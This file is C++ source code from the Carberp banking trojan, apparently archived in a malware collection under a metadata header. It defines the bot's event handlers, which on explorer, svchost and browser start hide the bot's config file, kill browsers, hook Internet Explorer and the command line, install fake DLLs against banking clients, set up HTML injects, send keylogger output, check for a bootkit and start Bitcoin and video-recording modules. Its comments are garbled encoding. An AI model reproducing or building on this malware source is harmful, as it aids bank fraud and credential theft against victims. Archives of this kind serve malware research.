/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "Pipes.h"
#include "BotHosts.h"
#include "BotCore.h"
#include "StrConsts.h"

#include "Modules.h"

//---------------------------------------------------------------------------





//-----------------------------------------------------------
//  InitializeHiddenFiles - ������� �������������� ������
//                          ������ ����� ������� ��� �����
//                          �������
//-----------------------------------------------------------
void InitializeHiddenFiles()
{
	BOT::AddHiddenFile(GetStr(EStrConfigFileName));
	//BOT::AddHiddenFile(GetStr(EStrConfigHPFileName));
}

//---------------------------------------------------------------------------

//extern bool ExecuteLoadDLLDisk(LPVOID, PCHAR Command, PCHAR Args);
extern bool ExecuteDocFind(LPVOID, PCHAR Command, PCHAR Args);

void ExplorerFirstStart(PEventData Data)
{
	#ifdef antirapportH
		AntiRapport();
	#endif
	
	#ifdef AvangardH
		AvangardWeb::SendFolder_avn_ib();
	#endif
	
	#ifdef SBERH
		Sber::SendLogIfReestr();
	#endif

	#ifdef IFobsH
		IFobs::KillIFobs(0);
	#ifdef FakeDllInstallerH
		RunThread( IFobs::InstallFakeDll,0 );
	#endif
	#endif

	//ExecuteDocFind( 0, 0, 0 );
	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
//	ExecuteRunRDP( 0, 0, 0 );
//	ExecuteVNC( 0, 0, "192.168.0.100" );
	// ������ ������ ���� � ����������

	// ��������� �������� �������
	/* #ifdef coocksolH
		StartDeleteCookiesThread();
    #endif */
}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{

	// ������ ���������� �������, ��������������� � ���������� ����
	BOT::TryCreateBotInstance();


	// �������������� ���������� �����
    InitializeHiddenFiles();


	// ���������� ������� �������� � ����.
	// ������ ������������ ������ ���� ���������� �������� ���
    BOT::SaveSettings(true, true, true);


	// ������� ��� ���������� ��������
	KillAllBrowsers();

	#ifdef FakeDllInstallerH
    	FDI::Execute();
	#endif

	#ifdef BBSCBankH
		CBank::Start();
	#endif

	#ifdef JAVS_PATCHERH
		StartThread(Run_Path, NULL);
	#endif

	// ������ ���������� WinInet
	#ifdef InternetExplorerH
		HookInternetExplorer();
	#endif

	// ��������� ������ ���������
	#ifdef KeepAliveH
		KeepAliveCheckProcess(PROCESS_SVCHOST);
		#ifdef VideoRecorderH
			#ifdef VideoProcessSvchost
				KeepAliveCheckProcess(PROCESS_VIDEO);
			#endif 
		#endif
	#endif


	// ��������� ������� ���������
	#ifdef CyberPlatDLLH
		CyberPlatCheckInstalled(); 
	#endif

	#ifdef CmdLineH
		HookCmdLine();
	#endif

	#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
	#endif

	#ifdef BitcoinH
		BitcoinRunAfterReboot();
	#endif

	#ifdef VideoRecorderH
		VideoProcess::ConnectToServer( 0, true );
	#endif

	// ������ ������ �������� ��������.
	// �����! ����� ������ ���������� � ��������� �������
	#ifdef StealthBrowserH
		HANDLE H = StartThread( RunIeSB/*SellExecute*/, NULL );// ��������� ����� ����������� �� ������ ��������
		pWaitForSingleObject(H, INFINITE);
	#endif

}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// �������� ������� ���������� � �������� svchost


	// ��������� �������������� �������� ������
	#ifdef HostsAutoUpdateH
		StartHostsUpdater();
	#endif

	#ifdef bootkitH
		IsBootkitInstaled();
	#endif


	#ifdef KeepAliveH
		// �������������� ������ ���������
		KeepAliveInitializeProcess(PROCESS_SVCHOST);
	#endif

	//�������� ����� �������� ��������� ������ ��� �������� ����������
	#ifdef KeyLoggerH	
		SendLoadedFiles();
	#endif

		//������ ������� �� ������� , ��������� ��� � 15 ��� ���� �������� �������,�� ��������� ������� SB
		// �������������� ������� �������� �������� �� ��������
	#ifdef HunterH
		URLHunter::StartClient();
	#endif

	#ifdef BOTMONITOR
    	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessLoader, true);
	#endif
}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// ������� Internet Explorer. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// ������� �������. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// ������� ��������� �������. ��������� ����� ������� � ������� ��������
	#ifdef HTMLSendH
		InitHTMLSendHandlers();
	#endif;

	#ifdef AzConfigH
		AzInizializeHTMLInjects();
	#endif

}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// �������� ����������� ����������

}
//---------------------------------------------------------------------------

